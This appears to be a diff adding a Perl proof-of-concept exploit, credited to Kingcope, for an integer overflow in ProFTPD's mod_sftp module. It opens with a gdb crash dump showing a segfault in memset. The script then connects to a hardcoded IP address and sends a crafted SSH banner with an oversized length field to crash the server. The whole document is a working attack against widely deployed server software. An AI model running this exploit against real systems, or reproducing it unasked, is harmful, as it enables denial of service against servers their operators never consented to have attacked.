@@ -1,0 +1,56 @@
+#ProFTPD mod_sftp Integer Overflow
+#by Kingcope
+#reference: http://www.castaglia.org/proftpd/modules/mod_sftp.html
+
+# Exploit Title: ProFTPD mod_sftp Integer Overflow
+# Date: 7 February 2011
+# Author: Kingcope
+# Software Link: http://www.castaglia.org/proftpd/modules/mod_sftp.html
+# Tested on: Centos 5.5
+
+#Program received signal SIGSEGV, Segmentation fault.
+#0x00391577 in memset () from /lib/libc.so.6
+#(gdb) i r
+#eax            0x0      0
+#ecx            0x203fffef       541065199
+#edx            0x1      1
+#ebx            0x80ffffbd       -2130706499
+#esp            0xbfcfd088       0xbfcfd088
+#ebp            0xbfcfd0a8       0xbfcfd0a8
+#esi            0x0      0
+#edi            0x0      0
+#eip            0x391577 0x391577 <memset+55>
+#eflags         0x210202 [ IF RF ID ]
+#cs             0x73     115
+#ss             0x7b     123
+#ds             0x7b     123
+#es             0x7b     123
+#fs             0x0      0
+#gs             0x33     51
+#(gdb) x/10i $eip
+#0x391577 <memset+55>:   rep stos %eax,%es:(%edi)
+#0x391579 <memset+57>:   mov    %edx,%ecx
+#0x39157b <memset+59>:   rep stos %al,%es:(%edi)
+#0x39157d <memset+61>:   mov    0x8(%esp),%eax
+#0x391581 <memset+65>:   pop    %edi
+#0x391582 <memset+66>:   ret
+#0x391583:       nop
+#0x391584:       nop
+#0x391585:       nop
+#0x391586:       nop
+
+use IO::Socket;
+
+$|=1;
+
+$pl = "\x53\x53\x48\x2D\x32\x2E\x30\x2D\x31\x2E\x32\x37\x20\x73\x73\x68\x6C\x69\x62\x3A\x20\x57\x69\x6E\x53\x53".
+"\x48\x44\x20\x33\x2E\x30\x35\x0D\x0A\x80\xff\xff\xff" . "AAAAAAAAAA";
+
+my $sock = IO::Socket::INET->new(PeerAddr => "192.168.2.5",
+                              PeerPort => '21',
+                              Proto    => 'tcp');
+
+read($sock, $xp, 10);
+#$x = <stdin>;
+print $sock $pl;
+exit;
